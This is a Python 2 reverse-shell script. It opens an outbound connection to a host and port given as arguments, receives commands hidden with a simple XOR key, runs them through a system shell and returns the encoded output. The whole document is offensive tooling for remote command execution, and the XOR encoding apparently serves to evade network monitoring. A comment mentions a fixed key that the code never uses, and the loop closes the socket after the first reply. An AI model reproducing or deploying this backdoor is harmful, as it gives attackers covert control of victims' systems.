#!/usr/bin/python

import socket,subprocess,sys

if len(sys.argv) == 4:
 RHOST = sys.argv[1]
 RPORT = sys.argv[2]
 xorkey = sys.argv[3]
 xorkey = int(xorkey)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, int(RPORT)))

 while True:
       # recieve XOR encoded data from network socket
       data = s.recv(1024)
       # XOR the data again with a '\x41' to get back to normal data
       en_data = bytearray(data)
       en_data = bytearray(x ^ xorkey for x in en_data)

       # Execute the decoded data as a command.  The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable
       comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
       STDOUT, STDERR = comm.communicate()

       # Encode the output and send to RHOST
       en_STDOUT = bytearray(STDOUT)
       en_STDOUT = bytearray(x ^ xorkey for x in en_STDOUT)
       s.send(en_STDOUT)
       s.close()

else:
 print "Example usage: ./prog <ip> <port> <xor key>"
 print "The xor key is an integer from 0 to 256"
